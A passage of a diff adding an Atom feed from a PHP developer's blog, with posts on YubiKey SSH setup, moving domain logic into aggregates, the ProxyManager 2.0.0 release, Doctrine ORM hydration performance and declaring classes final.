+      </p>
+
+      <p class="alert alert-warning">
+        <span class="label label-warning">CAUTION:</span>
+        Each YubiKey with an authentication gpg sub-key
+        will produce a different public SSH key: we will
+        need to seed our server with all the SSH public keys.
+      </p>
+
+      <p class="alert alert-info">
+        <span class="label label-info">TIP:</span>
+        consider using the YubiKey identifier (written on
+        the back of the device) as the comment for the
+        public SSH key, before storing it.
+      </p>
+
+      <p>
+        Steps to set up <code>gpg-agent</code> for SSH authentication
+        are also detailed in
+        <a href="https://github.com/drduh/YubiKey-Guide/tree/1ad37577db92726eadde4dc302a6f982ba7e82dc">
+          drduh/YubiKey-Guide
+        </a>.
+      </p>
+
+      <p>
+        Custom SSH keys are no longer needed: our GPG keys cover
+        most usage scenarios.
+      </p>
+
+      <h2>Conclusion</h2>
+
+      <p>
+        We now have at least 2 physical devices that give
+        us access to very critical parts of our infrastructure,
+        messaging, release systems and computers in general.
+      </p>
+
+      <p>
+        At this point, I suggest keeping one always with ourselves,
+        and treating it with extreme care. I made a custom
+        <a href="https://www.thingiverse.com/thing:532575" target="_blank">
+          3d-printed case for my YubiKey
+        </a>, and then put it all together in my physical keychain:
+      </p>
+
+      <p>
+        <img
+          src="/img/posts/2017-04-15-yubikey-for-ssh-gpg-git-and-local-login/physical-keychain.jpg"
+          alt="My physical keychain"
+          />
+      </p>
+
+      <p>
+        The backup key is to be kept in a secure location: while
+        theft isn't a big threat with YubiKeys, getting locked
+        out of all our systems is a problem. Make sure that you can
+        always either recover a YubiKey or the master GPG key.
+      </p>
+      ]]></content>
+  </entry>
+  <entry>
+    <title type="html"><![CDATA[On Aggregates and Domain Service interaction]]></title>
+    <link href="https://ocramius.github.io/blog/on-aggregates-and-external-context-interactions"/>
+    <updated>2017-01-25T00:00:00+01:00</updated>
+    <id>https://ocramius.github.io/blog/on-aggregates-and-external-context-interactions</id>
+    <content type="html"><![CDATA[<p>
+        Some time ago, I was asked where I put I/O operations when dealing with
+        aggregates.
+      </p>
+
+      <div data-tweet-id="808545609468801024" class="twitter-tweet"></div>
+
+      <p>
+        The context was a <abbr title="command query responsibility segregation">CQRS</abbr>
+        and Event Sourced architecture, but in general, the approach that I prefer also applies to most
+        imperative ORM entity code (assuming a proper data-mapper is involved).
+      </p>
+
+      <h3>Scenario</h3>
+
+      <p>
+        Let's use a practical example:
+      </p>
+
+      <pre><code class="gherkin">Feature: credit card payment for a shopping cart checkout
+
+          Scenario: a user must be able to check out a shopping cart
+          Given the user has added some products to their shopping cart
+          When the user checks out the shopping cart with their credit card
+          Then the user was charged for the shopping cart total price
+
+          Scenario: a user must not be able to check out an empty shopping cart
+          When the user checks out the shopping cart with their credit card
+          Then the user was not charged
+
+          Scenario: a user cannot check out an already purchased shopping cart
+          Given the user has added some products to their shopping cart
+          And the user has checked out the shopping cart with their credit card
+          When the user checks out the shopping cart with their credit card
+          Then the user was not charged
+      </code></pre>
+
+      <p>
+        The scenario is quite generic, but you should be able to see what the application is supposed to do.
+      </p>
+
+      <h3>An initial implementation</h3>
+
+      <p>
+        I will take an imperative command + domain-events approach, but we don't need to
+        dig into the patterns behind it, as it is quite simple.
+      </p>
+
+      <p>
+        We are looking at a command like following:
+      </p>
+
+      <pre><code class="php">final class CheckOutShoppingCart
+          {
+          public static function from(
+          CreditCardCharge $charge,
+          ShoppingCartId $shoppingCart
+          ) : self {
+          // ...
+          }
+
+          public function charge() : CreditCardCharge { /* ... */ }
+          public function shoppingCart() : ShoppingCartId { /* ... */ }
+          }
+      </code></pre>
+
+      <p>
+        If you are unfamiliar with what a
+        <abbr title="A command is a value object that encapsulates the intent and parameters of our business interaction">command</abbr>
+        is, it is just the object that our frontend or API throws at our actual
+        application logic.
+      </p>
+
+      <p>
+        Then there is an aggregate performing the actual domain logic work:
+      </p>
+
+      <pre><code class="php">final class ShoppingCart
+          {
+          // ... 
+
+          public function checkOut(CapturedCreditCardCharge $charge) : void
+          {
+          $this-&gt;charge = $charge;
+
+          $this-&gt;raisedEvents[] = ShoppingCartCheckedOut::from(
+          $this-&gt;id,
+          $this-&gt;charge
+          );
+          }
+
+          // ... 
+          }
+      </code></pre>
+
+      <p>
+        If you are unfamiliar with what an <i>aggregate</i> is,
+        it is the direct object in our interaction (look at the
+        sentences in the scenario).
+        In your existing applications, it would most likely (but not exclusively)
+        be an entity or a DB record or group of entities/DB records that you
+        are considering during a business interaction.
+      </p>
+
+      <p>
+        We need to glue this all together with a command handler:
+      </p>
+
+      <pre><code class="php">final class HandleCheckOutShoppingCart
+          {
+          public function __construct(Carts $carts, PaymentGateway $gateway)
+          {
+          $this-&gt;carts   = $carts;
+          $this-&gt;gateway = $gateway;
+          }
+
+          public function __invoke(CheckOutShoppingCart $command) : void
+          {
+          $shoppingCart = $this-&gt;carts-&gt;get($command-&gt;shoppingCart());
+
+          $payment = $this-&gt;gateway-&gt;captureCharge($command-&gt;charge());
+
+          $shoppingCart-&gt;checkOut($payment);
+          }
+          }
+      </code></pre>
+
+      <p>
+        This covers the "happy path" of our workflow, but we still lack:
+      </p>
+
+      <ul>
+        <li>The ability to check whether the payment has already occurred</li>
+        <li>Preventing payment for empty shopping carts</li>
+        <li>Preventing payment of an incorrect amount</li>
+        <li>Handling of critical failures on the payment gateway</li>
+      </ul>
+
+      <p>
+        In order to do that, we have to add some "guards" that prevent the interaction.
+        This is the approach that I've seen being used in the wild:
+      </p>
+
+      <pre><code class="php">final class HandleCheckOutShoppingCart
+          {
+          // ... 
+
+          public function __invoke(CheckOutShoppingCart $command) : void
+          {
+          $cartId = $command-&gt;shoppingCart();
+          $charge = $command-&gt;charge();
+
+          $shoppingCart = $this-&gt;carts-&gt;get($cartId);
+
+          // these guards are injected callables. They throw exceptions:
+          ($this-&gt;nonEmptyShoppingCart)($cartId);
+          ($this-&gt;nonPurchasedShoppingCart)($cartId);
+          ($this-&gt;paymentAmountMatches)($cartId, $charge-&gt;amount());
+
+          $payment = $this-&gt;gateway-&gt;captureCharge($charge);
+
+          $shoppingCart-&gt;checkOut($payment);
+          }
+          }
+      </code></pre>
+
+      <p>
+        As you can see, we are adding some logic to our command handler here.
+        This is usually done because dependency injection on the command handler
+        is easy.
+
+        Passing services to the aggregate via dependency injection is generally
+        problematic and to be avoided, since an aggregate is usually a 
+        <a href="http://misko.hevery.com/2008/09/30/to-new-or-not-to-new/" target="_blank">"newable type"</a>.
+      </p>
+
+      <p>
+        With this code, we are able to handle most unhappy paths, and eventually
+        also failures of the payment gateway (not in this article).
+      </p>
+
+      <h3>The problem</h3>
+
+      <p>
+        While the code above works, what we did is adding some domain-specific logic
+        to the command handler. Since the command handler is part of our application
+        layer, we are effectively diluting these checks into "less important layers". 
+      </p>
+
+      <p>
+        In addition to that, the command handler is required in tests
+        that consume the above specification: without the command handler, our logic
+        will fail to handle the unhappy paths in our scenarios.
+      </p>
+
+      <p>
+        For those that are reading and practice CQRS+<abbr title="Event Sourcing">ES</abbr>:
+        you also know that those guards aren't always simple to implement!
+        Read models, projections... Oh my!
+      </p>
+
+      <p>
+        Also: what if we wanted to react to those failures, rather than just stop
+        execution? Who is responsible or that?
+      </p>
+
+      <p>
+        If you went with the <abbr title="test driven development">TDD</abbr> way, then
+        you already saw all of this coming: let's fix it!
+      </p>
+
+      <h3>Moving domain logic back into the domain</h3>
+
+      <p>
+        What we did is putting logic from the domain layer (which should be in the aggregate)
+        into the application layer: let's turn around and put domain logic in the domain (reads:
+        in the aggregate logic).
+      </p>
+
+      <p>
+        Since we don't really want to inject a payment gateway as a constituent part
+        of our aggregate root (a newable shouldn't have non-newable depencencies),
+        we just borrow a brutally simple concept from functional programming:
+        we pass the <abbr
+          title="An interactor is just an object to which we delegate some work. In this case, a service">interactor</abbr>
+        as a method parameter.
+      </p>
+
+      <pre><code class="php">final class ShoppingCart
+          {
+          // ... 
+
+          public function checkOut(
+          CheckOutShoppingCart $checkOut,
+          PaymentGateway $paymentGateway
+          ) : void {
+          $charge = $checkOut-&gt;charge();
+
+          Assert::null($this-&gt;payment, 'Already purchased');
+          Assert::greaterThan(0, $this-&gt;totalAmount, 'Price invalid');
+          Assert::same($this-&gt;totalAmount, $charge-&gt;amount());
+
+          $this-&gt;charge = $paymentGateway-&gt;captureCharge($charge);
+
+          $this-&gt;raisedEvents[] = ShoppingCartCheckedOut::from(
+          $this-&gt;id,
+          $this-&gt;charge
+          );
+          }
+
+          // ... 
+          }
+      </code></pre>
+
+      <p>
+        The command handler is also massively simplified, since all it
+        does is forwarding the required dependencies to the aggregate:
+      </p>
+
+      <pre><code class="php">final class HandleCheckOutShoppingCart
+          {
+          // ... 
+
+          public function __invoke(CheckOutShoppingCart $command) : void
+          {
+          $this
+          -&gt;shoppingCarts
+          -&gt;get($command-&gt;shoppingCart())
+          -&gt;checkOut($command, $this-&gt;gateway);
+          }
+          }
+      </code></pre>
+
+      <h3>Conclusions</h3>
+
+      <p>
+        Besides getting rid of the command handler in the scenario tests, here
+        is a list of advantages of what we just implemented:
+      </p>
+
+      <ol>
+        <li>
+          The domain logic is all in one place, easy to read and easy to change.
+        </li>
+        <li>
+          We can run the domain without infrastructure code (note: the payment gateway is a
+          domain service)
+        </li>
+        <li>
+          We can prevent invalid interactions to happen without having to push verification
+          data across multiple layers
+        </li>
+        <li>
+          Our aggregate is now able to fullfill its main role: being a domain-specific state machine,
+          preventing invalid state mutations.
+        </li>
+        <li>
+          If something goes wrong, then the aggregate is able to revert state mutations.
+        </li>
+        <li>
+          We can raise domain events on failures, or execute custom domain logic.
+        </li>
+      </ol>
+
+      <p>
+        The approach described here fits any kind of application where there
+        is a concept of <abbr title="an object with an assigned identifier">Entity</abbr> or Aggregate.
+        Feel free to stuff your entity API with business logic!
+      </p>
+
+      <p>
+        Just remember that entities should only be self-aware, and only context-aware
+        in the context of certain business interactions: don't inject or statically
+        access domain services from within an entity.
+      </p>
+      ]]></content>
+  </entry>
+  <entry>
+    <title type="html"><![CDATA[ProxyManager 2.0.0 release and expected 2.x lifetime]]></title>
+    <link href="https://ocramius.github.io/blog/proxy-manager-2-0-0-release"/>
+    <updated>2016-01-29T00:00:00+01:00</updated>
+    <id>https://ocramius.github.io/blog/proxy-manager-2-0-0-release</id>
+    <content type="html"><![CDATA[<p style="align: center;">
+        <img
+          src="https://raw.githubusercontent.com/Ocramius/ProxyManager/2.0.0/proxy-manager.png"
+          alt="ProxyManager"
+          width="25%"
+          />
+      </p>
+
+      <p>
+        <a href="https://ocramius.github.io/ProxyManager" target="_blank">ProxyManager</a>
+        <a href="https://github.com/Ocramius/ProxyManager/releases/tag/2.0.0" target="_blank">2.0.0</a>
+        was finally released today!
+      </p>
+
+      <p>
+        It took a bit more than a year to get here, but major improvements were included
+        in this release, along with exclusive PHP 7 support.
+      </p>
+
+      <p>
+        Most of the features that we planned to provide were indeed
+        <a href="https://github.com/Ocramius/ProxyManager/blob/2.0.0/CHANGELOG.md#200" target="_blank">implemented into this release</a>.
+      </p>
+
+      <p>
+        As a negative note, HHVM compatibility was not achieved, as HHVM is not yet compatible
+        with PHP 7.0.x-compliant code.
+      </p>
+
+      <p>
+        As of this release, ProxyManager 1.0.x switches to
+        <a href="https://github.com/Ocramius/ProxyManager/blob/master/STABILITY.md#10x" target="_blank">security-only support</a>.
+      </p>
+
+      <h3>Planned maintenance schedule</h3>
+
+      <p>
+        ProxyManager 2.x will be a maintenance-only release:
+      </p>
+
+      <ul>
+        <li>
+          I plan to fix bugs until <time datetime="2017-01-29">January 29, 2017</time>
+        </li>
+        <li>
+          I plan to fix security issues until <time datetime="2018-01-29">January 29, 2018</time>
+        </li>
+      </ul>
+
+      <p>
+        No features are going to be added to ProxyManager 2.x: the current <code>master</code> branch will instead
+        become the development branch for version <code>3.0.0</code>.
+      </p>
+
+      <p>
+        Features for ProxyManager 3.0.0 are yet to be planned, but we reached exceptional code quality,
+        complete test coverage and nice performance improvements with 2.0.0: the future is bright!
+      </p>
+
+      <h3>Thank you!</h3>
+
+      <p>
+        And of course, a big <strong>"thank you"</strong> to all those who contributed to this release! 
+      </p>
+
+      <ul>
+        <li><a href="https://github.com/samsonasik" target="_blank">Abdul Malik Ikhsan</a></li>
+        <li><a href="https://github.com/vonalbert" target="_blank">Alberto Avon</a></li>
+        <li><a href="https://github.com/malukenho" target="_blank">Jefersson Nathan</a></li>
+        <li><a href="https://github.com/jbafford" target="_blank">John Bafford</a></li>
+      </ul>
+      ]]></content>
+  </entry>
+  <entry>
+    <title type="html"><![CDATA[Doctrine ORM Hydration Performance Optimization]]></title>
+    <link href="https://ocramius.github.io/blog/doctrine-orm-optimization-hydration"/>
+    <updated>2015-04-13T00:00:00+02:00</updated>
+    <id>https://ocramius.github.io/blog/doctrine-orm-optimization-hydration</id>
+    <content type="html"><![CDATA[<p class="alert alert-warning">
+        <span class="label label-warning">PRE-REQUISITE:</span>
+        Please note that this article explains complexity in internal ORM operations with the <strong>Big-O</strong>
+        notation. Consider reading
+        <a href="http://stackoverflow.com/questions/487258/plain-english-explanation-of-big-o" target="_blank">this article</a>, 
+        if you are not familiar with the <strong>Big-O</strong> syntax.
+      </p>
+
+      <h2>What is hydration?</h2>
+
+      <p>
+        Doctrine ORM, like most ORMs, is performing a process called <strong>Hydration</strong> when converting database
+        results into objects.
+      </p>
+
+      <p>
+        This process usually involves reading a record from a database result and then converting the column values
+        into an object's properties.
+      </p>
+
+      <p>
+        Here is a little pseudo-code snippet that shows what a mapper is actually doing under the hood:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          $results          = [];
+          $reflectionFields = $mappingInformation-&gt;reflectionFields();
+
+          foreach ($resultSet-&gt;fetchRow() as $row) {
+          $object = new $mappedClassName;
+
+          foreach ($reflectionFields as $column =&gt; $reflectionField) {
+          $reflectionField-&gt;setValue($object, $row[$column]);
+          }
+
+          $results[] = $object;
+          }
+
+          return $results;
+      </code></pre>
+
+      <p>
+        That's a very basic example, but this gives you an idea of what an ORM is doing for you.
+      </p>
+
+      <p class="alert alert-success">
+        As you can see, this is an <code>O(N)</code> operation (assuming a constant number of reflection fields).
+      </p>
+
+      <p>
+        There are multiple ways to speed up this particular process, but we can only remove constant overhead from
+        it, and not actually reduce it to something more efficient.
+      </p>
+
+      <h2>When is hydration expensive?</h2>
+
+      <p>
+        Hydration starts to become expensive with complex resultsets.
+      </p>
+
+      <p>
+        Consider the following SQL query:
+      </p>
+
+      <pre><code class="sql">SELECT
+          u.id       AS userId,
+          u.username AS userUsername,
+          s.id       AS socialAccountId,
+          s.username AS socialAccountUsername,
+          s.type     AS socialAccountType
+          FROM
+          user u
+          LEFT JOIN
+          socialAccount s
+          ON s.userId = u.id
+      </code></pre>
+
+      <p>
+        Assuming that the relation from <code>user</code> to <code>socialAccount</code> is a <code>one-to-many</code>,
+        this query retrieves all the social accounts for all the users in our application
+      </p>
+
+      <p>
+        A resultset may be as follows:
+      </p>
+
+      <table class="table table-bordered table-striped">
+        <thead>
+          <tr>
+            <th>userId</th>
+            <th>userUsername</th>
+            <th>socialAccountId</th>
+            <th>socialAccountUsername</th>
+            <th>socialAccountType</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>1</td>
+            <td>ocramius@gmail.com</td>
+            <td>20</td>
+            <td>ocramius</td>
+            <td>Facebook</td>
+          </tr>
+          <tr>
+            <td>1</td>
+            <td>ocramius@gmail.com</td>
+            <td>21</td>
+            <td>@ocramius</td>
+            <td>Twitter</td>
+          </tr>
+          <tr>
+            <td>1</td>
+            <td>ocramius@gmail.com</td>
+            <td>22</td>
+            <td>ocramiusaethril</td>
+            <td>Last.fm</td>
+          </tr>
+          <tr>
+            <td>2</td>
+            <td>grandpa@example.com</td>
+            <td><code>NULL</code></td>
+            <td><code>NULL</code></td>
+            <td><code>NULL</code></td>
+          </tr>
+          <tr>
+            <td>3</td>
+            <td>grandma@example.com</td>
+            <td>85</td>
+            <td>awesomegrandma9917</td>
+            <td>Facebook</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p>
+        As you can see, we are now joining 2 tables in the results, and the ORM has to perform more complicated operations:
+      </p>
+
+      <dl class="dl-horizontal">
+        <dt>
+          Hydrate <strong>1</strong>
+        </dt>
+        <dd>
+          <code>User</code> object for
+          <i>ocramius@gmail.com</i>
+        </dd>
+        <dt>
+          Hydrate <strong>3</strong>
+        </dt>
+        <dd>
+          <code>SocialAccount</code> 
+          instances into 
+          <code>User#$socialAccounts</code> 
+          for 
+          <i>ocramius@gmail.com</i>,
+          while skipping re-hydrating
+          <code>User</code>
+          <i>ocramius@gmail.com</i>
+        </dd>
+        <dt>
+          Hydrate <strong>1</strong>
+        </dt>
+        <dd>
+          <code>User</code>
+          object for
+          <i>grandpa@example.com</i>
+        </dd>
+        <dt>
+          Skip hydrating
+        </dt>
+        <dd>
+          <code>User#$socialAccounts</code>
+          for
+          <i>grandpa@example.com</i>,
+          as no social accounts are associated
+        </dd>
+        <dt>
+          Hydrate <strong>1</strong>
+        </dt>
+        <dd>
+          <code>User</code>
+          object for
+          <i>grandma@example.com</i>
+        </dd>
+        <dt>
+          Hydrate <strong>1</strong>
+        </dt>
+        <dd>
+          <code>SocialAccount</code>
+          instance into
+          <code>User#$socialAccounts</code>
+          for
+          <i>grandma@example.com</i>
+        </dd>
+      </dl>
+
+      <p class="alert alert-info">
+        <span class="label label-info">DOCS</span>
+        This operation is what is done by Doctrine ORM when you use the
+        <abbr title="Doctrine Query Language">DQL</abbr>
+        <a href="http://docs.doctrine-project.org/en/latest/reference/dql-doctrine-query-language.html#joins" target="_blank">
+          Fetch Joins
+        </a>
+        feature.
+      </p>
+
+      <p>
+        Fetch joins are a very efficient way to hydrate multiple records without resorting to multiple queries, but there
+        are two performance issues with this approach (both not being covered by this article):
+      </p>
+
+      <ul>
+        <li>
+          Empty records require some useless looping inside the ORM internals (see <i>grandpa@example.com</i>'s
+          social account). This is a quick operation, but we can't simply ignore those records upfront.
+        </li>
+        <li>
+          If multiple duplicated records are being joined (happens a lot in <code>many-to-many</code> associations),
+          then we want to de-duplicate records by keeping a temporary in-memory identifier map.
+        </li>
+      </ul>
+
+      <p class="alert alert-danger">
+        Additionally, our operation starts to become more complicated, as it is now <code>O(n * m)</code>, with
+        <code>n</code> and <code>m</code> being the records in the <code>user</code> and the <code>socialAccount</code>
+        tables.
+      </p>
+
+      <p>
+        What the ORM is actually doing here is <strong>normalizing</strong> data that was fetched in a de-normalized
+        resultset, and that is going through your CPU and your memory.
+      </p>
+
+      <h2>Bringing hydration cost to an extreme</h2>
+
+      <p>
+        The process of hydration becomes extremely expensive when more than <strong>2</strong> <code>LEFT JOIN</code>
+        operations clauses are part of our queries:
+      </p>
+
+      <pre><code class="sql">SELECT
+          u.id         AS userId,
+          u.username   AS userUsername,
+          sa.id        AS socialAccountId,
+          sa.username  AS socialAccountUsername,
+          sa.type      AS socialAccountType,
+          s.id         AS sessionId,
+          s.expiresOn  AS sessionExpiresOn,
+          FROM
+          user u
+          LEFT JOIN
+          socialAccount sa
+          ON sa.userId = u.id
+          LEFT JOIN
+          session s
+          ON s.userId = u.id
+      </code></pre>
+
+      <p>
+        This kind of query produces a much larger resultset, and the results are duplicated by a lot:
+      </p>
+
+      <table class="table table-bordered table-striped" style="max-width: 500px">
+        <thead>
+          <tr>
+            <th>userId</th>
+            <th>user Username</th>
+            <th>social Account Id</th>
+            <th>social Account Username</th>
+            <th>social Account Type</th>
+            <th>session Id</th>
+            <th>session Expires On</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>1</td>
+            <td>ocramius@gmail.com</td>
+            <td>20</td>
+            <td>ocramius</td>
+            <td>Facebook</td>
+            <td>ocramius-macbook</td>
+            <td>2015-04-20 22:08:56</td>
+          </tr>
+          <tr>
+            <td>1</td>
+            <td>ocramius@gmail.com</td>
+            <td>21</td>
+            <td>@ocramius</td>
+            <td>Twitter</td>
+            <td>ocramius-macbook</td>
+            <td>2015-04-20 22:08:56</td>
+          </tr>
+          <tr>
+            <td>1</td>
+            <td>ocramius@gmail.com</td>
+            <td>22</td>
+            <td>ocramiusaethril</td>
+            <td>Last.fm</td>
+            <td>ocramius-macbook</td>
+            <td>2015-04-20 22:08:56</td>
+          </tr>
+          <tr>
+            <td>1</td>
+            <td>ocramius@gmail.com</td>
+            <td>20</td>
+            <td>ocramius</td>
+            <td>Facebook</td>
+            <td>ocramius-android</td>
+            <td>2015-04-20 22:08:56</td>
+          </tr>
+          <tr>
+            <td>1</td>
+            <td>ocramius@gmail.com</td>
+            <td>21</td>
+            <td>@ocramius</td>
+            <td>Twitter</td>
+            <td>ocramius-android</td>
+            <td>2015-04-20 22:08:56</td>
+          </tr>
+          <tr>
+            <td>1</td>
+            <td>ocramius@gmail.com</td>
+            <td>22</td>
+            <td>ocramiusaethril</td>
+            <td>Last.fm</td>
+            <td>ocramius-android</td>
+            <td>2015-04-20 22:08:56</td>
+          </tr>
+          <tr>
+            <td>2</td>
+            <td>grandpa@example.com</td>
+            <td><code>NULL</code></td>
+            <td><code>NULL</code></td>
+            <td><code>NULL</code></td>
+            <td><code>NULL</code></td>
+            <td><code>NULL</code></td>
+          </tr>
+          <tr>
+            <td>3</td>
+            <td>grandma@example.com</td>
+            <td>85</td>
+            <td>awesomegrandma</td>
+            <td>Facebook</td>
+            <td>home-pc</td>
+            <td>2015-04-15 10:05:31</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p>
+        If you try to re-normalize this resultset, you can actually see how many useless de-duplication operation
+        have to happen.
+      </p>
+
+      <p>
+        That is because the <code>User</code> <i>ocramius@gmail.com</i> has multiple active sessions on
+        multiple devices, as well as multiple social accounts.
+      </p>
+
+      <p class="alert alert-danger">
+        <span class="label label-warning">SLOW!</span>
+        The hydration operations on this resultset are <code>O(n * m * q)</code>, which I'm going to simply
+        generalize as <code>O(n ^ m)</code>, with <code>n</code> being the amount of results, and <code>m</code>
+        being the amount of joined tables.
+      </p>
+
+      <p>
+        Here is a graphical representation of <code>O(n ^ m)</code>:
+      </p>
+
+      <p>
+        <img
+          src="/img/posts/2015-04-13-doctrine-orm-optimization-hydration/boy-that-escalated-quickly.jpg"
+          alt="Boy, that escalated quickly"
+          />
+      </p>
+
+      <p>
+        Yes, it is bad.
+      </p>
+
+      <h2>How to avoid <code>O(n ^ m)</code> hydration?</h2>
+
+      <p>
+        <code>O(n ^ m)</code> can be avoided with some very simple, yet effective approaches.
+      </p>
+
+      <blockquote cite="me">
+        No, it's not <em>"don't use an ORM"</em>, you muppet.
+      </blockquote>
+
+      <h3>Avoiding <code>one-to-many</code> and <code>many-to-many</code> associations</h3>
+
+      <p>
+        Collection valued associations are as useful as problematic, as you never know how much data you are
+        going to load.
+      </p>
+
+      <p>
+        Unless you use <code>fetch="EXTRA_LAZY"</code> and <code>Doctrine\Common\Collections\Collection#slice()</code>
+        wisely, you will probably make your app crash if you initialize a very large collection of associated objects.
+      </p>
+
+      <p>
+        Therefore, the simplest yet most limiting advice is to avoid collection-valued associations whenever
+        they are not strictly necessary.
+      </p>
+
+      <p>
+        Additionally, reduce the amount of bi-directional associations to the strict necessary.
+      </p>
+
+      <p>
+        After all, code that is not required should not be written in first place.
+      </p>
+
+      <h3>Multi-step hydration</h3>
+
+      <p>
+        The second approach is simpler, and allows us to exploit how the ORM's <code>UnitOfWork</code> is working
+        internally.
+      </p>
+
+      <p>
+        In fact, we can simply split hydration for different associations into different queries, or multiple steps:
+      </p>
+
+      <pre><code class="sql">SELECT
+          u.id         AS userId,
+          u.username   AS userUsername,
+          s.id         AS socialAccountId,
+          s.username   AS socialAccountUsername,
+          s.type       AS socialAccountType
+          FROM
+          user u
+          LEFT JOIN
+          socialAccount s
+          ON s.userId = u.id
+      </code></pre>
+
+      <p>
+        We already know this query: hydration for it is <code>O(n * m)</code>, but that's the best we can do,
+        regardless of how we code it.
+      </p>
+
+      <pre><code class="sql">SELECT
+          u.id        AS userId,
+          u.username  AS userUsername,
+          s.id        AS sessionId,
+          s.expiresOn AS sessionExpiresOn,
+          FROM
+          user u
+          LEFT JOIN
+          session s
+          ON s.userId = u.id
+      </code></pre>
+
+      <p>
+        This query is another <code>O(n * m)</code> hydration one, but we are now only loading the user sessions
+        in the resultsets, avoiding duplicate results overall.
+      </p>
+
+      <p>
+        By re-fetching the same users, we are telling the ORM to re-hydrate those objects (which are now in memory,
+        stored in the <code>UnitOfWork</code>): that fills the <code>User#$sessions</code> collections.
+      </p>
+
+      <p>
+        Also, please note that we could have used a <code>JOIN</code> instead of a <code>LEFT JOIN</code>, but that
+        would have triggered lazy-loading on the sessions for the <i>grandpa@example.com</i> <code>User</code>
+      </p>
+
+      <p>
+        Additionally, we could also skip the <i>userUsername</i> field from the results, as it already is in memory
+        and well known.
+      </p>
+
+      <p class="alert alert-success">
+        <span class="label label-success">SOLUTION:</span>
+        We now reduced the hydration complexity from <code>O(n ^ m)</code> to <code>O(n * m * k)</code>, with
+        <code>n</code> being the amount of <code>User</code> instances, <code>m</code> being the amount of associated
+        <code>to-many</code> results, and <code>k</code> being the amount of associations that we want to hydrate.
+      </p>
+
+      <h3>Coding multi-step hydration in Doctrine ORM</h3>
+
+      <p>
+        Let's get more specific and code the various queries represented above in
+        <abbr title="Doctrine Query Language">DQL</abbr>.
+      </p>
+
+      <p>
+        Here is the <code>O(n ^ m)</code> query (in this case, <code>O(n ^ 3)</code>):
+      </p>
+
+      <pre><code class="php">return $entityManager
+          -&gt;createQuery('
+          SELECT
+          user, socialAccounts, sessions 
+          FROM
+          User user
+          LEFT JOIN
+          user.socialAccounts socialAccounts
+          LEFT JOIN
+          user.sessions sessions
+          ')
+          -&gt;getResult();
+      </code></pre>
+
+      <p>
+        This is how you'd code the multi-step hydration approach:
+      </p>
+
+      <pre><code class="php">$users = $entityManager
+          -&gt;createQuery('
+          SELECT
+          user, socialAccounts
+          FROM
+          User user
+          LEFT JOIN
+          user.socialAccounts socialAccounts
+          ')
+          -&gt;getResult();
+
+          $entityManager
+          -&gt;createQuery('
+          SELECT PARTIAL
+          user.{id}, sessions
+          FROM
+          User user
+          LEFT JOIN
+          user.sessions sessions
+          ')
+          -&gt;getResult(); // result is discarded (this is just re-hydrating the collections)
+
+          return $users;
+      </code></pre>
+
+      <p>
+        I'd also add that this is the only legitimate use-case for partial hydration that I ever
+        had, but it's a personal opinion/feeling.
+      </p>
+
+      <h2>Other alternatives (science fiction)</h2>
+
+      <p>
+        As you may have noticed, all this overhead is caused by normalizing de-normalized data coming
+        from the DB.
+      </p>
+
+      <p>
+        Other solutions that we may work on in the future include:
+      </p>
+
+      <ul>
+        <li>
+          Generating hydrator code - solves constant overhead issues, performs better with
+          <abbr title="Just In Time">JIT</abbr> engines such as <abbr title="HipHop VM">HHVM</abbr>
+        </li>
+        <li>
+          Leveraging the capabilities of powerful engines such as PostgreSQL, which comes with JSON
+          support (since version 9.4), and would allow us to normalize the fetched data to some extent
+        </li>
+        <li>
+          Generate more complex SQL, creating an own output format that is "hydrator-friendly" (re-inventing
+          the wheel here seems like a bad idea)
+        </li>
+      </ul>
+
+      <h2>Research material</h2>
+
+      <p>
+        Just so you stop thinking that I pulled out all these thought out of thin air, here is a repository
+        with actual code examples that you can run, measure, compare and patch yourself:
+      </p>
+
+      <h4>
+        <a href="https://github.com/Ocramius/Doctrine2StepHydration" target="_blank">
+          https://github.com/Ocramius/Doctrine2StepHydration
+        </a>
+      </h4>
+
+      <p>
+        Give it a spin and see the results for yourself!
+      </p>
+      ]]></content>
+  </entry>
+  <entry>
+    <title type="html"><![CDATA[When to declare classes final]]></title>
+    <link href="https://ocramius.github.io/blog/when-to-declare-classes-final"/>
+    <updated>2015-01-06T00:00:00+01:00</updated>
+    <id>https://ocramius.github.io/blog/when-to-declare-classes-final</id>
+    <content type="html"><![CDATA[<p>
+        <strong>
+          <abbr title="too long, didn't read">TL;DR</abbr>: 
+          Make your classes always <code>final</code>, if they implement an interface, 
+          and no other public methods are defined
+        </strong>
+      </p>
+
+      <p>
+        In the last month, I had a few discussions about the usage of the <code>final</code> marker on PHP classes.
+      </p>
+
+      <p>
+        The pattern is recurrent:
+      </p>
+
+      <ol>
+        <li>I ask for a newly introduced class to be declared as <code>final</code></li>
+        <li>the author of the code is reluctant to this proposal, stating that <code>final</code> limits flexibility</li>
+        <li>I have to explain that flexibility comes from good abstractions, and not from inheritance</li>
+      </ol>
+
+      <p>
+        It is therefore clear that coders need a better explanation of <strong>when</strong> to use <code>final</code>, 
+        and when to avoid it.
+      </p>
+
+      <p>
+        There are 
+        <a href="http://verraes.net/2014/05/final-classes-in-php/" target="_blank">many</a> 
+        <a href="http://www.javaworld.com/article/2073649/core-java/why-extends-is-evil.html" target="_blank">other</a>
+        <a href="http://stackoverflow.com/questions/137868/using-final-modifier-whenever-applicable-in-java" target="_blank">articles</a>
+        about the subject, but this is mainly thought as a "quick reference" for those
+        that will ask me the same questions in future.
+      </p>
+
+      <h3>When to use "final":</h3>
+
+      <p>
+        <code>final</code> should be used <strong>whenever possible</strong>.
+      </p>
+
+      <h3>Why do I have to use <code>final</code>?</h3>
+
+      <p>
+        There are numerous reasons to mark a class as <code>final</code>: I will list and describe those that are
+        most relevant in my opinion.
+      </p>
+
+      <h4>1. Preventing massive inheritance chain of doom</h4>
+
+      <p>
+        Developers have the bad habit of fixing problems by providing specific subclasses of an existing (not adequate)
+        solution. You probably saw it yourself with examples like following:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          class Db { /* ... */ }
+          class Core extends Db { /* ... */ }
+          class User extends Core { /* ... */ }
+          class Admin extends User { /* ... */ }
+          class Bot extends Admin { /* ... */ }
+          class BotThatDoesSpecialThings extends Bot { /* ... */ }
+          class PatchedBot extends BotThatDoesSpecialThings { /* ... */ }
+      </code></pre>
+
